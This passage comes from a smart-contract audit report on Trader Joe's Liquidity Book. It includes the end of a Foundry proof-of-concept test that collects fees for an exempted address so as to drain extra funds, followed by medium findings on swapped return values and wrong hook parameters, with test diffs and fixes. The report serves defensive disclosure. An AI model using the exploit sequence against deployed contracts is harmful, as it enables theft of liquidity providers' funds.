) = pair.getReservesAndId();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        console.log(&quot;id after&quot; , id);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        console.log(&quot;Bob balance:&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        console.log(token6D.balanceOf(BOB));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        console.log(token18D.balanceOf(BOB));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        console.log(&quot;-------------&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 amount0In = 100e18;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256[] memory _ids = new uint256[](1); _ids[0] = uint256(ID_ONE);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256[] memory _distributionX = new uint256[](1); _distributionX[0] = uint256(Constants.PRECISION);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256[] memory _distributionY = new uint256[](1); _distributionY[0] = uint256(0);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        console.log(&quot;Minting for BOB:&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        console.log(amount0In);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        console.log(&quot;-------------&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        token6D.mint(address(pair), amount0In);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        //token18D.mint(address(pair), amount1In);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        pair.mint(_ids, _distributionX, _distributionY, address(pair));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256[] memory amounts = new uint256[](1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        console.log(&quot;***&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        for (uint256 i; i &lt; 1; i++) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            amounts[i] = pair.balanceOf(address(pair), _ids[i]);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            console.log(amounts[i]);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256[] memory profit_ids = new uint256[](1); profit_ids[0] = 8388608;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        (uint256 profit_X, uint256 profit_Y) = pair.pendingFees(address(pair), profit_ids);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        console.log(&quot;profit x&quot;, profit_X);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        console.log(&quot;profit y&quot;, profit_Y);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        pair.collectFees(address(pair), profit_ids);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        (uint256 swap_x, uint256 swap_y) = pair.swap(true,BOB);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        console.log(&quot;swap x&quot;, swap_x);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        console.log(&quot;swap y&quot;, swap_y);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        console.log(&quot;Bob balance after swap:&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        console.log(token6D.balanceOf(BOB));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        console.log(token18D.balanceOf(BOB));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        console.log(&quot;-------------&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        console.log(&quot;*****&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        pair.burn(_ids, amounts, BOB);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        console.log(&quot;Bob balance after burn:&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        console.log(token6D.balanceOf(BOB));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        console.log(token18D.balanceOf(BOB));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        console.log(&quot;-------------&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<h3 id=\"tools-used-2\" style=\"position:relative;\"><a href=\"#tools-used-2\" aria-label=\"tools used 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Manual audit, foundry</p>\n<h3 id=\"recommended-mitigation-steps-4\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-4\" aria-label=\"recommended mitigation steps 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Code should not exempt any address from _cacheFees(). Even <code>address(0)</code> is important, because attacker can collectFees for the 0 address to overflow the FeesX/FeesY variables, even though the fees are not retrievable for them.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/423\">0x0Louis (Trader Joe) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/423#issuecomment-1312203078\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The Warden has shown how to exploit logic paths that would skip fee accrual, to be able to gather more fees than expected.</p>\n<p>While the finding pertains to a loss of fees, the repeated attack will allow stealing reserves as well, for this reason I agree with High Severity.</p>\n</blockquote>\n<hr>\n<h1 id=\"medium-risk-findings-7\" style=\"position:relative;\"><a href=\"#medium-risk-findings-7\" aria-label=\"medium risk findings 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Medium Risk Findings (7)</h1>\n<h2 id=\"m-01-lbrouterremoveliquidity-returning-wrong-values\" style=\"position:relative;\"><a href=\"#m-01-lbrouterremoveliquidity-returning-wrong-values\" aria-label=\"m 01 lbrouterremoveliquidity returning wrong values permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/105\">[M-01] <code>LBRouter.removeLiquidity</code> returning wrong values</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/105\">Lambda</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-10-traderjoe/blob/e81b78ddb7cc17f0ece921fbaef2c2521727094b/src/LBRouter.sol#L291\">LBRouter.sol#L291</a><br></p>\n<p><code>LBRouter.removeLiquidity</code> reorders tokens when the user did not pass them in the pair order (ascending order):</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"27\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_tokenX</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">_LBPair</span><span class=\"mtk1\">.</span><span class=\"mtk11\">tokenX</span><span class=\"mtk1\">()) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            (</span><span class=\"mtk12\">_tokenX</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_tokenY</span><span class=\"mtk1\">) = (</span><span class=\"mtk12\">_tokenY</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_tokenX</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            (</span><span class=\"mtk12\">_amountXMin</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_amountYMin</span><span class=\"mtk1\">) = (</span><span class=\"mtk12\">_amountYMin</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_amountXMin</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>However, when returning <code>amountX</code> and <code>amountY</code>, it is ignored if the order was changed:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"28\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">(</span><span class=\"mtk12\">amountX</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amountY</span><span class=\"mtk1\">) = </span><span class=\"mtk11\">_removeLiquidity</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_LBPair</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_amountXMin</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_amountYMin</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_ids</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_amounts</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_to</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>Therefore, when the order of the tokens is swapped by the function, the return value <code>amountX</code> (“Amount of token X returned”) in reality is the amount of the user-provided token Y that is returned and vice versa.</p>\n<p>Because this is an exposed function that third-party protocols / contracts will use, this can cause them to malfunction. For instance, when integrating with Trader Joe, something natural to do is:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"29\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">(uint256 amountAReceived, uint256 amountBReceived) = LBRouter.removeLiquidity(address(tokenA), address(tokenB), ...);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">contractBalanceA += amountAReceived;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">contractBalanceB += amountBReceived;</span></span></code></pre>\n<p>This snippet will only be correct when the token addresses are passed in the right order, which should not be the case. When they are not passed in the right order, the accounting of third-party contracts will be messed up, leading to vulnerabilities / lost funds there.</p>\n<h3 id=\"proof-of-concept-5\" style=\"position:relative;\"><a href=\"#proof-of-concept-5\" aria-label=\"proof of concept 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof Of Concept</h3>\n<p>First consider the following diff, which shows a scenario when <code>LBRouter</code> does not switch <code>tokenX</code> and <code>tokenY</code>, resulting in correct return values:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"30\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/test/LBRouter.Liquidity.t.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/test/LBRouter.Liquidity.t.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -57,7 +57,9 @@ contract LiquidityBinRouterTest is TestHelper {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         pair.setApprovalForAll(address(router), true);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        router.removeLiquidity(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256 token6BalBef = token6D.balanceOf(DEV);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256 token18BalBef = token18D.balanceOf(DEV);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        (uint256 amountFirstRet, uint256 amountSecondRet) = router.removeLiquidity(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             token6D,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             token18D,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             DEFAULT_BIN_STEP,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -70,7 +72,9 @@ contract LiquidityBinRouterTest is TestHelper {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         assertEq(token6D.balanceOf(DEV), amountXIn);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        assertEq(amountXIn, token6BalBef + amountFirstRet);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         assertEq(token18D.balanceOf(DEV), _amountYIn);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        assertEq(_amountYIn, token18BalBef + amountSecondRet);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     function testRemoveLiquidityReverseOrder() public {</span></span></span></code></pre>\n<p>This test passes (as it should). Now, consider the following diff, where <code>LBRouter</code> switches <code>tokenX</code> and <code>tokenY</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"31\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/test/LBRouter.Liquidity.t.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/test/LBRouter.Liquidity.t.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -57,12 +57,14 @@ contract LiquidityBinRouterTest is TestHelper {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         pair.setApprovalForAll(address(router), true);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        router.removeLiquidity(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            token6D,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256 token6BalBef = token6D.balanceOf(DEV);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256 token18BalBef = token18D.balanceOf(DEV);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        (uint256 amountFirstRet, uint256 amountSecondRet) = router.removeLiquidity(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             token18D,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            token6D,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             DEFAULT_BIN_STEP,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            totalXbalance,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             totalYBalance,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            totalXbalance,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             ids,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             amounts,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             DEV,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -70,7 +72,9 @@ contract LiquidityBinRouterTest is TestHelper {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         assertEq(token6D.balanceOf(DEV), amountXIn);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        assertEq(amountXIn, token6BalBef + amountSecondRet);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         assertEq(token18D.balanceOf(DEV), _amountYIn);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        assertEq(_amountYIn, token18BalBef + amountFirstRet);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     function testRemoveLiquidityReverseOrder() public {</span></span></span></code></pre>\n<p>This test should also pass (the order of the tokens was only switched), but it does not because the return values are mixed up.</p>\n<h3 id=\"recommended-mitigation-steps-5\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-5\" aria-label=\"recommended mitigation steps 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Add the following statement in the end:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"32\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_tokenX</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">_LBPair</span><span class=\"mtk1\">.</span><span class=\"mtk11\">tokenX</span><span class=\"mtk1\">()) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk15\">return</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">amountY</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amountX</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/105\">0x0Louis (Trader Joe) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/105#issuecomment-1313783137\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The Warden has shown how, due to an inconsistent re-ordering, the removeLiqudity function can return incorrect (swapped) amounts.</p>\n<p>While invariants are not broken, this is an example of an incorrect function behaviour.</p>\n<p>For this reason, despite no loss of value, I believe Medium Severity to be appropriate as the potential impact warrants an increased severity.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-02-beforetokentransfer-called-with-wrong-parameters-in-lbtoken_burn\" style=\"position:relative;\"><a href=\"#m-02-beforetokentransfer-called-with-wrong-parameters-in-lbtoken_burn\" aria-label=\"m 02 beforetokentransfer called with wrong parameters in lbtoken_burn permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/108\">[M-02] <code>beforeTokenTransfer</code> called with wrong parameters in <code>LBToken._burn</code></a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/108\">Lambda</a>, also found by <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/514\">imare</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/513\">indijanc</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/509\">MiloTruck</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/504\">zzzitron</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/503\">chaduke</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/502\">bctester</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/500\">Aymen0909</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/499\">The_GUILD</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/498\">RustyRabbit</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/497\">phaze</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/179\">0x52</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/125\">ladboy233</a>, and <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/19\">KingNFT</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-10-traderjoe/blob/37258d595d596c195507234f795fa34e319b0a68/src/LBToken.sol#L237\">LBToken.sol#L237</a><br></p>\n<p>In <code>LBToken._burn</code>, the <code>_beforeTokenTransfer</code> hook is called with <code>from = address(0)</code> and <code>to = _account</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"33\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">_beforeTokenTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk12\">_account</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_id</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>Through a lucky coincidence, it turns out that this in the current setup does not cause a high severity issue. <code>_burn</code> is always called with <code>_account = address(this)</code>, which means that <code>LBPair._beforeTokenTransfer</code> is a NOP. However, this wrong call is very dangerous for future extensions or protocol that built on top of the protocol / fork it.</p>\n<h3 id=\"proof-of-concept-6\" style=\"position:relative;\"><a href=\"#proof-of-concept-6\" aria-label=\"proof of concept 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof Of Concept</h3>\n<p>Let’s say the protocol is extended with some logic that needs to track mints / burns. The canonical way to do this would be:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"34\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_beforeTokenTransfer</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span 